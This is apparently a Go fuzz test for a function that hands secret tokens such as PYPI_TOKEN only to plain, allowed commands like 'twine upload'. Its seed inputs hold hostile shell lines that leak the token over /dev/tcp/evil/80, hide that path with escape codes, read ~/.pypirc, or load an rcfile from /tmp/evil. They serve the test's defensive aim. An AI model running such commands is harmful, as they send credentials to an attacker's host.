package security

import (
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"mvdan.cc/sh/v3/syntax"
)

// FuzzBindSecrets checks that BindSecrets never panics, that a name is never both given and
// withheld, and that a command that the reader cannot read gives nothing. For each given name
// it checks that the text is one simple command with no assignment and no substitution, that
// no redirect goes to /dev/tcp or /dev/udp, and that the one part index points to the bound
// part after the allowed wrappers.
func FuzzBindSecrets(f *testing.F) {
	secrets := map[string][]string{"PYPI_TOKEN": {"twine upload"}, "GH_TOKEN": {"gh release", "/usr/bin/gh pr"}}
	for _, s := range []string{
		"twine upload x", `twine upload -u "$PYPI_TOKEN" -p "$PYPI_TOKEN"`, "timeout 5 nice -n 3 twine upload",
		`twine upload --password="$PYPI_TOKEN" dist/* > /tmp/log 2>&1`, "gh release create && /usr/bin/gh pr list",
		"cd d && twine upload x | tail -n 5", "sh -c 'twine upload'", "echo $PYPI_TOKEN", "sudo twine upload",
		"twine upload x; env", "twine upload 'x", "time twine upload x", "env twine upload x",
		`bash --rcfile /tmp/evil -ic 'twine upload x'`, `bash -xc 'twine upload -p "$PYPI_TOKEN"' 2>/tmp/t`,
		`twine upload -p "$PYPI_TOKEN"; cd "$_" 2>/tmp/t`,
		`twine upload -p "$PYPI_TOKEN"; { (( $_ )); } 2>$'/dev/\x74cp/evil/80'`,
		`twine upload -p $PYPI'_'TOKEN; for i in "$PYPI_TOKEN"; do cd "$i" 2>/tmp/t; done`,
		`N=$'\x50YPI_TOKEN'; (( N )) 2>/tmp/f; twine upload`,
		`cd "$PYPI_TOKEN" 2>/dev/tcp/evil/80; twine upload --version`,
		`grep . <<< "$PYPI_TOKEN" > /dev/tcp/evil/80 && twine upload`,
		`head -c 4096 <<< "$PYPI_TOKEN" > /tmp/t; twine upload`,
		`twine upload x 2>$'/dev/\x74cp/evil/80'`, `twine upload x &> "/dev/"tcp/evil/80`, `twine upload x 2>"$D"`,
		"twine upload x <<EOF\n$PYPI_TOKEN\nEOF", "twine upload x <<'EOF'\n$PYPI_TOKEN\nEOF",
		`twine upload $(cat ~/.pypirc)`, "PATH=/x twine upload", "env -i twine upload x",
	} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, s string) {
		p := ReadCommand(s)
		give, withheld := BindSecrets(p, secrets)
		if !p.Read && len(give) > 0 {
			t.Fatalf("%q: an unread command gives %+v", s, give)
		}
		seen := map[string]bool{}
		for _, g := range give {
			if _, ok := secrets[g.Name]; !ok || seen[g.Name] || len(g.Parts) != 1 {
				t.Fatalf("%q: bad binding %+v", s, g)
			}
			seen[g.Name] = true
			i := g.Parts[0]
			if i < 0 || i >= len(p.Cmds) || !matchesPrefix(p.Cmds[i].Argv, splitEntries(secrets[g.Name])) {
				t.Fatalf("%q: part %d is not a bound part", s, i)
			}
			for _, c := range p.Cmds[:i+1] {
				if len(c.Via) > 0 || c.assigned || c.Depth != 0 {
					t.Fatalf("%q: part %+v is not in one command", s, c)
				}
			}
			for _, c := range p.Cmds[:i] {
				if !slices.Contains(fixedWrappers, filepath.Base(c.Argv[0])) {
					t.Fatalf("%q: %s is given through %q", s, g.Name, c.Argv[0])
				}
			}
			checkOneCommand(t, s)
		}
		for _, w := range withheld {
			if _, ok := secrets[w.Name]; !ok || seen[w.Name] || w.Reason == "" {
				t.Fatalf("%q: bad withheld %+v", s, w)
			}
			seen[w.Name] = true
		}
		if !slices.IsSortedFunc(give, func(a, b Binding) int { return strings.Compare(a.Name, b.Name) }) {
			t.Fatalf("%q: give is not sorted", s)
		}
	})
}

// checkOneCommand fails the test when s is not one simple command, or when a redirect of s
// can reach the network.
func checkOneCommand(t *testing.T, s string) {
	t.Helper()
	f, err := syntax.NewParser(syntax.Variant(syntax.LangBash)).Parse(strings.NewReader(s), "")
	if err != nil {
		t.Fatalf("%q: a secret is given to a command that does not parse: %v", s, err)
	}
	if len(f.Stmts) != 1 {
		t.Fatalf("%q: a secret is given to %d statements", s, len(f.Stmts))
	}
	syntax.Walk(f, func(n syntax.Node) bool {
		switch x := n.(type) {
		case *syntax.CmdSubst, *syntax.ProcSubst, *syntax.Subshell, *syntax.Block, *syntax.BinaryCmd,
			*syntax.IfClause, *syntax.WhileClause, *syntax.ForClause, *syntax.CaseClause, *syntax.FuncDecl,
			*syntax.ArithmCmd, *syntax.TestClause, *syntax.DeclClause, *syntax.LetClause, *syntax.CoprocClause:
			t.Fatalf("%q: a secret is given to a command with a %T", s, x)
		case *syntax.Stmt:
			if x.Negated || x.Background || x.Coprocess || x.Disown {
				t.Fatalf("%q: a secret is given to a statement that is not plain", s)
			}
		case *syntax.CallExpr:
			if len(x.Assigns) > 0 {
				t.Fatalf("%q: a secret is given to a command with an assignment", s)
			}
		case *syntax.Redirect:
			if x.Word != nil {
				var b strings.Builder
				for _, wp := range x.Word.Parts {
					switch v := wp.(type) {
					case *syntax.Lit:
						b.WriteString(unquoteBare(v.Value))
					case *syntax.SglQuoted:
						b.WriteString(decodeANSIC(v.Value))
					case *syntax.DblQuoted:
						for _, q := range v.Parts {
							if l, ok := q.(*syntax.Lit); ok {
								b.WriteString(unquoteDouble(l.Value))
							}
						}
					}
				}
				if w := b.String(); strings.Contains(w, "/dev/tcp/") || strings.Contains(w, "/dev/udp/") {
					t.Fatalf("%q: a secret is given to a command with a network redirect", s)
				}
			}
		}
		return true
	})
}
